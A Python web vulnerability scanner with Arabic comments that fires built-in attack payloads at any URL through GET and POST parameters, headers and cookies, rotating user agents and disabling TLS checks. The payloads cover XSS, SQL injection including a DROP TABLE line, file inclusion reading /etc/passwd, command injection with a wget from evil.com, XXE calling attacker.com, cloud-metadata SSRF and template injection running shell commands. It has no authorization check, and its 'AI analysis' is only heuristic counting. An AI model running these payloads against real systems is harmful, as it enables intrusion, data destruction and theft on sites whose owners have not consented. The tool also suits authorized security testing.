#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
الماسح الأمني المتقدم الذكي - Advanced Intelligent Security Scanner v3.0
"""

import requests
import random
import time
import json
import base64
import urllib.parse
import html
import re
import threading
import os
import asyncio
import aiohttp
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
import hashlib
import socket
from fake_useragent import UserAgent

class AdvancedIntelligentScanner:
    """ماسح أمني متقدم مع ميزات الذكاء الاصطناعي"""
    
    def __init__(self):
        requests.packages.urllib3.disable_warnings()
        self.lock = threading.Lock()
        self.ua = UserAgent()
        
        # قوائم الحمولات الذكية
        self.intelligent_payloads = {
            'xss': self._generate_intelligent_xss_payloads(),
            'sql': self._generate_intelligent_sql_payloads(),
            'lfi': self._generate_intelligent_lfi_payloads(),
            'command': self._generate_intelligent_command_payloads(),
            'xxe': self._generate_intelligent_xxe_payloads(),
            'nosql': self._generate_intelligent_nosql_payloads(),
            'ssrf': self._generate_intelligent_ssrf_payloads(),
            'ssti': self._generate_intelligent_ssti_payloads(),
            'graphql': self._generate_intelligent_graphql_payloads()
        }
        
        # مؤشرات الذكاء الاصطناعي
        self.ai_indicators = {
            'xss': ['alert(', 'javascript:', 'onerror=', 'onload=', 'onfocus=', 'onclick=', 'eval(', 'document.write'],
            'sql': ['mysql_fetch_array', 'ORA-', 'Microsoft OLE DB Provider', 'SQLServer JDBC Driver', 'PostgreSQL query failed', 'syntax error'],
            'lfi': ['root:x:', 'daemon:x:', 'bin:x:', 'sys:x:', 'nobody:x:', 'for 16-bit app support'],
            'command': ['uid=', 'gid=', 'groups=', 'whoami', 'root', 'administrator', 'nt authority'],
            'xxe': ['file://', 'http://', 'ENTITY', 'DOCTYPE', 'SYSTEM', '&xxe;'],
            'nosql': ['MongoDB', 'CouchDB', 'RethinkDB', 'NoSQL', 'document', 'collection'],
            'ssrf': ['file://', 'http://', 'https://', 'ftp://', 'ldap://', 'dict://'],
            'ssti': ['{{', '}}', '${', '}', '{%', '%}'],
            'graphql': ['__schema', '__type', '__Field', 'GraphQL', 'IntrospectionQuery']
        }

    def _generate_intelligent_xss_payloads(self):
        """توليد حمولات XSS ذكية"""
        base_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<svg/onload=alert('XSS')>",
            "<img src=# onerror=alert('XSS')>",
            "<math><mtext><script>alert('XSS')</script></mtext></math>"
        ]
        
        # إضافة متغيرات ذكية
        intelligent_payloads = base_payloads.copy()
        
        # حمولات متقدمة
        advanced_payloads = [
            "<svg/onload=alert(String.fromCharCode(88,83,83))>",
            "<img src=x onerror=alert(document.domain)>",
            "<script>alert(document.cookie)</script>",
            "<iframe src=\"javascript:alert(window.location)\">",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<button onclick=alert(1)>Click</button>",
            "<marquee onstart=alert(1)>XSS</marquee>",
            "<audio src=x onerror=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<source onerror=alert(1)>",
            "<track onerror=alert(1)>",
            "<details/open/ontoggle=alert(1)>"
        ]
        
        intelligent_payloads.extend(advanced_payloads)
        return intelligent_payloads

    def _generate_intelligent_sql_payloads(self):
        """توليد حمولات SQL الذكية"""
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "1' OR '1'='1",
            "1' UNION SELECT null--",
            "1' UNION SELECT null,null--",
            "1' UNION SELECT null,null,null--",
            "1' AND (SELECT * FROM users WHERE username='admin')--",
            "1' AND LENGTH(database())>0--",
            "1' UNION SELECT @@version,2,3--",
            "1' UNION SELECT table_name,2,3 FROM information_schema.tables--",
            "1' UNION SELECT column_name,2,3 FROM information_schema.columns--",
            "'; DROP TABLE users;--",
            "' UNION SELECT user(),database(),version()--",
            "admin' OR '1'='1'--"
        ]

    def _generate_intelligent_lfi_payloads(self):
        """توليد حمولات LFI الذكية"""
        return [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "file:///etc/passwd",
            "../../../../windows/system32/drivers/etc/hosts",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "../../../../boot.ini",
            "php://filter/read=convert.base64-encode/resource=config.php",
            "../../../../var/log/apache2/access.log"
        ]

    def _generate_intelligent_command_payloads(self):
        """توليد حمولات Command Injection الذكية"""
        return [
            "; id",
            "| id",
            "&& id",
            "$(id)",
            "`id`",
            "; cat /etc/passwd",
            "| whoami",
            "&& uname -a",
            "; net user",
            "; ipconfig",
            "; ls -la",
            "; echo 'test'",
            "; wget http://evil.com/shell.txt"
        ]

    def _generate_intelligent_xxe_payloads(self):
        """توليد حمولات XXE الذكية"""
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe.xml">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
        ]

    def _generate_intelligent_nosql_payloads(self):
        """توليد حمولات NoSQL الذكية"""
        return [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.password.length > 0"}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
            '{"$or": [{"username": "admin"}, {"username": "admin"}]}',
            '{"username": {"$exists": true}}',
            '{"password": {"$exists": true}}'
        ]

    def _generate_intelligent_ssrf_payloads(self):
        """توليد حمولات SSRF الذكية"""
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://localhost:80",
            "http://localhost:8080",
            "http://127.0.0.1:80",
            "file:///etc/passwd",
            "dict://localhost:11211/",
            "gopher://localhost:70/",
            "ftp://localhost:21/"
        ]

    def _generate_intelligent_ssti_payloads(self):
        """توليد حمولات SSTI الذكية"""
        return [
            "{{7*7}}",
            "${7*7}",
            "{{config}}",
            "{{self}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}"
        ]

    def _generate_intelligent_graphql_payloads(self):
        """توليد حمولات GraphQL الذكية"""
        return [
            "{__schema{types{name,fields{name}}}}",
            "{__type(name:\"User\"){name,fields{name,type{name}}}}",
            "query{user(id:1){id,name,email}}",
            "{__schema{queryType{name}mutationType{name}subscriptionType{name}}}"
        ]

    def intelligent_scan(self, target_url, scan_types=None, max_threads=10):
        """فحص ذكي متقدم"""
        if scan_types is None:
            scan_types = ['xss', 'sql', 'lfi', 'command', 'xxe', 'nosql', 'ssrf', 'ssti', 'graphql']
        
        print(f"[🤖] بدء الفحص الذكي المتقدم لـ {target_url}")
        print(f"[📊] أنواع الفحص: {', '.join(scan_types)}")
        
        results = {
            'target': target_url,
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'ai_analysis': {},
            'risk_assessment': {},
            'recommendations': []
        }
        
        # فحص متوازي للثغرات
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for scan_type in scan_types:
                future = executor.submit(self._intelligent_vulnerability_scan, target_url, scan_type)
                futures.append((scan_type, future))
            
            for scan_type, future in futures:
                try:
                    vulnerabilities = future.result(timeout=30)
                    results['vulnerabilities'].extend(vulnerabilities)
                except Exception as e:
                    print(f"[⚠️] خطأ في فحص {scan_type}: {e}")
        
        # تحليل الذكاء الاصطناعي
        ai_analysis = self._perform_ai_analysis(results['vulnerabilities'])
        results['ai_analysis'] = ai_analysis
        
        # تقييم المخاطر
        risk_assessment = self._assess_risk_level(results['vulnerabilities'])
        results['risk_assessment'] = risk_assessment
        
        # التوصيات
        recommendations = self._generate_recommendations(results['vulnerabilities'])
        results['recommendations'] = recommendations
        
        return results

    def _intelligent_vulnerability_scan(self, target_url, scan_type):
        """فحص ذكي للثغرات"""
        vulnerabilities = []
        
        if scan_type not in self.intelligent_payloads:
            return vulnerabilities
        
        payloads = self.intelligent_payloads[scan_type]
        
        for payload in payloads:
            try:
                # اختبار GET parameters
                get_vulns = self._test_get_parameters(target_url, scan_type, payload)
                vulnerabilities.extend(get_vulns)
                
                # اختبار POST parameters
                post_vulns = self._test_post_parameters(target_url, scan_type, payload)
                vulnerabilities.extend(post_vulns)
                
                # اختبار Headers
                header_vulns = self._test_headers(target_url, scan_type, payload)
                vulnerabilities.extend(header_vulns)
                
                # اختبار Cookies
                cookie_vulns = self._test_cookies(target_url, scan_type, payload)
                vulnerabilities.extend(cookie_vulns)
                
            except Exception as e:
                print(f"[⚠️] خطأ في فحص {scan_type}: {e}")
                continue
        
        return vulnerabilities

    def _test_get_parameters(self, target_url, scan_type, payload):
        """اختبار معلمات GET"""
        vulnerabilities = []
        test_urls = [
            f"{target_url}?test={payload}",
            f"{target_url}?id=1&test={payload}",
            f"{target_url}?search={payload}",
            f"{target_url}?q={payload}",
            f"{target_url}?input={payload}"
        ]
        
        for test_url in test_urls:
            try:
                headers = {'User-Agent': self.ua.random}
                response = requests.get(test_url, headers=headers, verify=False, timeout=10)
                
                if self._detect_vulnerability(response.text, scan_type, payload):
                    vulnerability = {
                        'type': scan_type,
                        'method': 'GET',
                        'url': test_url,
                        'payload': payload,
                        'evidence': self._extract_evidence(response.text, scan_type),
                        'severity': self._calculate_severity(scan_type, response.status_code),
                        'confidence': self._calculate_confidence(response.text, scan_type)
                    }
                    vulnerabilities.append(vulnerability)
                    
            except Exception:
                continue
        
        return vulnerabilities

    def _test_post_parameters(self, target_url, scan_type, payload):
        """اختبار معلمات POST"""
        vulnerabilities = []
        post_data_list = [
            {'test': payload},
            {'id': '1', 'test': payload},
            {'search': payload},
            {'input': payload},
            {'data': payload}
        ]
        
        for post_data in post_data_list:
            try:
                headers = {
                    'User-Agent': self.ua.random,
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                response = requests.post(target_url, data=post_data, headers=headers, verify=False, timeout=10)
                
                if self._detect_vulnerability(response.text, scan_type, payload):
                    vulnerability = {
                        'type': scan_type,
                        'method': 'POST',
                        'url': target_url,
                        'payload': payload,
                        'post_data': post_data,
                        'evidence': self._extract_evidence(response.text, scan_type),
                        'severity': self._calculate_severity(scan_type, response.status_code),
                        'confidence': self._calculate_confidence(response.text, scan_type)
                    }
                    vulnerabilities.append(vulnerability)
                    
            except Exception:
                continue
        
        return vulnerabilities

    def _test_headers(self, target_url, scan_type, payload):
        """اختبار الهيدرات"""
        vulnerabilities = []
        test_headers = [
            {'User-Agent': payload},
            {'X-Forwarded-For': payload},
            {'X-Real-IP': payload},
            {'Referer': payload},
            {'X-Api-Version': payload}
        ]
        
        for headers in test_headers:
            try:
                headers['User-Agent'] = self.ua.random
                response = requests.get(target_url, headers=headers, verify=False, timeout=10)
                
                if self._detect_vulnerability(response.text, scan_type, payload):
                    vulnerability = {
                        'type': scan_type,
                        'method': 'HEADERS',
                        'url': target_url,
                        'payload': payload,
                        'header_used': list(headers.keys())[0],
                        'evidence': self._extract_evidence(response.text, scan_type),
                        'severity': self._calculate_severity(scan_type, response.status_code),
                        'confidence': self._calculate_confidence(response.text, scan_type)
                    }
                    vulnerabilities.append(vulnerability)
                    
            except Exception:
                continue
        
        return vulnerabilities

    def _test_cookies(self, target_url, scan_type, payload):
        """اختبار الكوكيز"""
        vulnerabilities = []
        cookie_data = {
            'session': payload,
            'test': payload,
            'id': payload,
            'user': payload,
            'auth': payload
        }
        
        try:
            headers = {'User-Agent': self.ua.random}
            response = requests.get(target_url, headers=headers, cookies=cookie_data, verify=False, timeout=10)
            
            if self._detect_vulnerability(response.text, scan_type, payload):
                vulnerability = {
                    'type': scan_type,
                    'method': 'COOKIES',
                    'url': target_url,
                    'payload': payload,
                    'cookie_used': 'session',
                    'evidence': self._extract_evidence(response.text, scan_type),
                    'severity': self._calculate_severity(scan_type, response.status_code),
                    'confidence': self._calculate_confidence(response.text, scan_type)
                }
                vulnerabilities.append(vulnerability)
                
        except Exception:
            pass
        
        return vulnerabilities

    def _detect_vulnerability(self, response_text, scan_type, payload):
        """الكشف الذكي عن الثغرات"""
        if scan_type not in self.ai_indicators:
            return False
        
        indicators = self.ai_indicators[scan_type]
        response_text_lower = response_text.lower()
        
        # البحث عن مؤشرات الثغرات
        indicator_matches = 0
        for indicator in indicators:
            if indicator.lower() in response_text_lower:
                indicator_matches += 1
        
        # البحث عن الحمولة في الاستجابة
        payload_found = payload.lower() in response_text_lower
        
        # منطق الكشف الذكي
        if scan_type == 'xss' and payload_found:
            return True
        elif scan_type == 'sql' and indicator_matches >= 2:
            return True
        elif scan_type in ['lfi', 'command', 'xxe'] and indicator_matches >= 1:
            return True
        elif scan_type == 'nosql' and 'mongodb' in response_text_lower:
            return True
        elif scan_type == 'ssrf' and any(proto in response_text_lower for proto in ['http://', 'https://', 'file://']):
            return True
        elif scan_type == 'ssti' and ('49' in response_text or '777' in response_text):
            return True
        elif scan_type == 'graphql' and ('__schema' in response_text or 'GraphQL' in response_text):
            return True
        
        return False

    def _extract_evidence(self, response_text, scan_type):
        """استخراج الأدلة"""
        evidence = []
        response_text_lower = response_text.lower()
        
        if scan_type in self.ai_indicators:
            for indicator in self.ai_indicators[scan_type]:
                if indicator.lower() in response_text_lower:
                    # استخراج السياق المحيط بالمؤشر
                    index = response_text_lower.find(indicator.lower())
                    start = max(0, index - 50)
                    end = min(len(response_text), index + len(indicator) + 50)
                    context = response_text[start:end]
                    evidence.append({
                        'indicator': indicator,
                        'context': context,
                        'position': index
                    })
        
        return evidence

    def _calculate_severity(self, scan_type, status_code):
        """حساب شدة الثغرة"""
        severity_scores = {
            'xss': 2,
            'sql': 3,
            'lfi': 3,
            'command': 4,
            'xxe': 3,
            'nosql': 2,
            'ssrf': 3,
            'ssti': 4,
            'graphql': 2
        }
        
        base_severity = severity_scores.get(scan_type, 2)
        
        # تعديل الشدة حسب رمز الحالة
        if status_code == 200:
            base_severity += 1
        elif status_code in [403, 406]:
            base_severity += 0.5
        elif status_code >= 500:
            base_severity += 2
        
        return min(base_severity, 5)

    def _calculate_confidence(self, response_text, scan_type):
        """حساب ثقة الكشف"""
        confidence_scores = {
            'xss': 0.9,
            'sql': 0.8,
            'lfi': 0.85,
            'command': 0.9,
            'xxe': 0.7,
            'nosql': 0.75,
            'ssrf': 0.8,
            'ssti': 0.85,
            'graphql': 0.8
        }
        
        base_confidence = confidence_scores.get(scan_type, 0.7)
        
        # زيادة الثقة حسب وجود مؤشرات متعددة
        if scan_type in self.ai_indicators:
            indicator_count = sum(1 for indicator in self.ai_indicators[scan_type] 
                                if indicator.lower() in response_text.lower())
            if indicator_count >= 3:
                base_confidence += 0.1
            elif indicator_count >= 5:
                base_confidence += 0.2
        
        return min(base_confidence, 1.0)

    def _perform_ai_analysis(self, vulnerabilities):
        """تحليل الذكاء الاصطناعي للثغرات"""
        analysis = {
            'total_vulnerabilities': len(vulnerabilities),
            'vulnerability_types': {},
            'severity_distribution': {'critical': 0, 'high': 0, 'medium': 0, 'low': 0},
            'attack_patterns': [],
            'risk_indicators': [],
            'anomaly_score': 0.0
        }
        
        if not vulnerabilities:
            return analysis
        
        # تحليل أنواع الثغرات
        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            severity = vuln['severity']
            
            if vuln_type not in analysis['vulnerability_types']:
                analysis['vulnerability_types'][vuln_type] = 0
            analysis['vulnerability_types'][vuln_type] += 1
            
            # تصنيف الشدة
            if severity >= 4:
                analysis['severity_distribution']['critical'] += 1
            elif severity >= 3:
                analysis['severity_distribution']['high'] += 1
            elif severity >= 2:
                analysis['severity_distribution']['medium'] += 1
            else:
                analysis['severity_distribution']['low'] += 1
        
        # تحليل أنماط الهجمات
        analysis['attack_patterns'] = self._identify_attack_patterns(vulnerabilities)
        
        # مؤشرات المخاطر
        analysis['risk_indicators'] = self._identify_risk_indicators(vulnerabilities)
        
        # حساب درجة الشذوذ
        analysis['anomaly_score'] = self._calculate_anomaly_score(vulnerabilities)
        
        return analysis

    def _identify_attack_patterns(self, vulnerabilities):
        """تحديد أنماط الهجمات"""
        patterns = []
        
        # البحث عن أنماط التسلسل
        vuln_types = [vuln['type'] for vuln in vulnerabilities]
        
        if 'sql' in vuln_types and 'xss' in vuln_types:
            patterns.append('Multi-vector attack: SQL + XSS')
        
        if 'lfi' in vuln_types and 'command' in vuln_types:
            patterns.append('Privilege escalation attempt: LFI + Command injection')
        
        if 'ssrf' in vuln_types and any(v['type'] == 'ssrf' for v in vulnerabilities):
            patterns.append('Internal network reconnaissance')
        
        # البحث عن أنماط متقدمة
        high_severity_count = sum(1 for v in vulnerabilities if v['severity'] >= 3)
        if high_severity_count >= 3:
            patterns.append('High-severity vulnerability cluster')
        
        return patterns

    def _identify_risk_indicators(self, vulnerabilities):
        """تحديد مؤشرات المخاطر"""
        indicators = []
        
        # مؤشرات المخاطر العالية
        critical_vulns = [v for v in vulnerabilities if v['severity'] >= 4]
        if critical_vulns:
            indicators.append(f"Critical vulnerabilities found: {len(critical_vulns)}")
        
        # مؤشرات التكرار
        vuln_counts = {}
        for vuln in vulnerabilities:
            key = f"{vuln['type']}_{vuln['method']}"
            vuln_counts[key] = vuln_counts.get(key, 0) + 1
        
        for key, count in vuln_counts.items():
            if count >= 5:
                indicators.append(f"Repeated vulnerability pattern: {key} ({count} times)")
        
        # مؤشرات الثقة العالية
        high_confidence_vulns = [v for v in vulnerabilities if v['confidence'] >= 0.9]
        if high_confidence_vulns:
            indicators.append(f"High-confidence vulnerabilities: {len(high_confidence_vulns)}")
        
        return indicators

    def _calculate_anomaly_score(self, vulnerabilities):
        """حساب درجة الشذوذ"""
        if not vulnerabilities:
            return 0.0
        
        # عوامل الشذوذ
        anomaly_factors = {
            'severity_variance': 0,
            'type_diversity': 0,
            'method_diversity': 0,
            'confidence_variance': 0
        }
        
        # تباين الشدة
        severities = [v['severity'] for v in vulnerabilities]
        if len(severities) > 1:
            mean_severity = sum(severities) / len(severities)
            variance = sum((s - mean_severity) ** 2 for s in severities) / len(severities)
            anomaly_factors['severity_variance'] = min(variance / 4, 1.0)
        
        # تنوع الأنواع
        vuln_types = set(v['type'] for v in vulnerabilities)
        anomaly_factors['type_diversity'] = min(len(vuln_types) / 9, 1.0)
        
        # تنوع الطرق
        methods = set(v['method'] for v in vulnerabilities)
        anomaly_factors['method_diversity'] = min(len(methods) / 4, 1.0)
        
        # تباين الثقة
        confidences = [v['confidence'] for v in vulnerabilities]
        if len(confidences) > 1:
            mean_confidence = sum(confidences) / len(confidences)
            variance = sum((c - mean_confidence) ** 2 for c in confidences) / len(confidences)
            anomaly_factors['confidence_variance'] = min(variance * 4, 1.0)
        
        # حساب الدرجة النهائية
        anomaly_score = sum(anomaly_factors.values()) / len(anomaly_factors)
        return anomaly_score

    def _assess_risk_level(self, vulnerabilities):
        """تقييم مستوى المخاطر"""
        assessment = {
            'overall_risk': 'LOW',
            'risk_score': 0,
            'critical_factors': [],
            'mitigation_priority': []
        }
        
        if not vulnerabilities:
            return assessment
        
        # حساب درجة المخاطر
        total_severity = sum(v['severity'] for v in vulnerabilities)
        total_confidence = sum(v['confidence'] for v in vulnerabilities)
        
        risk_score = (total_severity * 0.7) + (total_confidence * 0.3)
        assessment['risk_score'] = min(risk_score / len(vulnerabilities), 10.0)
        
        # تحديد مستوى المخاطر العام
        if assessment['risk_score'] >= 8:
            assessment['overall_risk'] = 'CRITICAL'
        elif assessment['risk_score'] >= 6:
            assessment['overall_risk'] = 'HIGH'
        elif assessment['risk_score'] >= 4:
            assessment['overall_risk'] = 'MEDIUM'
        else:
            assessment['overall_risk'] = 'LOW'
        
        # العوامل الحرجة
        critical_vulns = [v for v in vulnerabilities if v['severity'] >= 4]
        if critical_vulns:
            assessment['critical_factors'].append(f"{len(critical_vulns)} critical vulnerabilities")
        
        # أولويات التخفيف
        vuln_priority = {}
        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in vuln_priority:
                vuln_priority[vuln_type] = []
            vuln_priority[vuln_type].append(vuln['severity'])
        
        # ترتيب حسب المتوسط
        for vuln_type, severities in sorted(vuln_priority.items(), key=lambda x: sum(x[1])/len(x[1]), reverse=True):
            avg_severity = sum(severities) / len(severities)
            assessment['mitigation_priority'].append({
                'type': vuln_type,
                'count': len(severities),
                'avg_severity': avg_severity
            })
        
        return assessment

    def _generate_recommendations(self, vulnerabilities):
        """توليد التوصيات"""
        recommendations = []
        
        if not vulnerabilities:
            recommendations.append("No vulnerabilities found - maintain current security posture")
            return recommendations
        
        # توصيات عامة
        vuln_types = set(v['type'] for v in vulnerabilities)
        
        if 'sql' in vuln_types:
            recommendations.extend([
                "Implement parameterized queries (prepared statements)",
                "Use stored procedures where possible",
                "Implement input validation and sanitization",
                "Apply principle of least privilege to database users"
            ])
        
        if 'xss' in vuln_types:
            recommendations.extend([
                "Implement Content Security Policy (CSP)",
                "Use output encoding for user-supplied data",
                "Implement input validation and sanitization",
                "Use secure frameworks that auto-escape output"
            ])
        
        if 'lfi' in vuln_types:
            recommendations.extend([
                "Use whitelisting for file inclusion",
                "Avoid user-controlled file paths",
                "Implement proper access controls",
                "Use chroot jails or containerization"
            ])
        
        if 'command' in vuln_types:
            recommendations.extend([
                "Avoid system calls with user input",
                "Use language-specific safe alternatives",
                "Implement strict input validation",
                "Use parameterized OS commands"
            ])
        
        # توصيات حسب الشدة
        critical_vulns = [v for v in vulnerabilities if v['severity'] >= 4]
        if critical_vulns:
            recommendations.insert(0, "🚨 CRITICAL: Address critical vulnerabilities immediately")
            recommendations.insert(1, "Implement emergency response procedures")
        
        # توصيات مرحلية
        recommendations.append("Conduct regular security assessments")
        recommendations.append("Implement security monitoring and alerting")
        recommendations.append("Provide security training for development team")
        
        return recommendations

    def generate_ai_report(self, scan_results):
        """توليد تقرير ذكي"""
        report = {
            'scan_summary': {
                'target': scan_results['target'],
                'scan_time': scan_results['scan_time'],
                'total_vulnerabilities': len(scan_results['vulnerabilities']),
                'overall_risk': scan_results['risk_assessment']['overall_risk'],
                'risk_score': scan_results['risk_assessment']['risk_score']
            },
            'ai_insights': {
                'attack_patterns': scan_results['ai_analysis']['attack_patterns'],
                'risk_indicators': scan_results['ai_analysis']['risk_indicators'],
                'anomaly_score': scan_results['ai_analysis']['anomaly_score']
            },
            'technical_details': {
                'vulnerabilities': scan_results['vulnerabilities'],
                'vulnerability_distribution': scan_results['ai_analysis']['vulnerability_types'],
                'severity_distribution': scan_results['ai_analysis']['severity_distribution']
            },
            'recommendations': scan_results['recommendations']
        }
        
        return report

# دالة مساعدة للتشغيل السريع
def run_intelligent_scan(target_url, output_file=None):
    """تشغيل الماسح الذكي"""
    scanner = AdvancedIntelligentScanner()
    
    print(f"[🚀] بدء الفحص الذكي المتقدم لـ {target_url}")
    
    # تشغيل الفحص
    scan_results = scanner.intelligent_scan(target_url)
    
    # توليد التقرير الذكي
    ai_report = scanner.generate_ai_report(scan_results)
    
    # عرض النتائج
    print(f"\n[📊] نتائج الفحص الذكي:")
    print(f"[🎯] إجمالي الثغرات: {len(scan_results['vulnerabilities'])}")
    print(f"[⚡] مستوى المخاطر: {scan_results['risk_assessment']['overall_risk']}")
    print(f"[📈] درجة المخاطر: {scan_results['risk_assessment']['risk_score']:.2f}/10")
    
    if scan_results['vulnerabilities']:
        print(f"\n[🔍] أنواع الثغرات:")
        for vuln_type, count in scan_results['ai_analysis']['vulnerability_types'].items():
            print(f"    • {vuln_type.upper()}: {count}")
    
    if scan_results['ai_analysis']['attack_patterns']:
        print(f"\n[🎯] أنماط الهجمات المكتشفة:")
        for pattern in scan_results['ai_analysis']['attack_patterns']:
            print(f"    • {pattern}")
    
    if scan_results['recommendations']:
        print(f"\n[💡] التوصيات الرئيسية:")
        for i, recommendation in enumerate(scan_results['recommendations'][:5], 1):
            print(f"    {i}. {recommendation}")
    
    # حفظ التقرير
    if output_file:
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(ai_report, f, ensure_ascii=False, indent=2)
        print(f"\n[💾] تم حفظ التقرير في: {output_file}")
    
    return ai_report

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="الماسح الأمني الذكي المتقدم")
    parser.add_argument("target", help="الهدف المراد فحصه")
    parser.add_argument("-o", "--output", help="ملف حفظ التقرير")
    parser.add_argument("-t", "--threads", type=int, default=10, help="عدد مؤشرات الترابط")
    
    args = parser.parse_args()
    
    try:
        run_intelligent_scan(args.target, args.output)
    except KeyboardInterrupt:
        print("\n[🛑] تم إيقاف الفحص بواسطة المستخدم")
    except Exception as e:
        print(f"[❌] خطأ في التشغيل: {e}")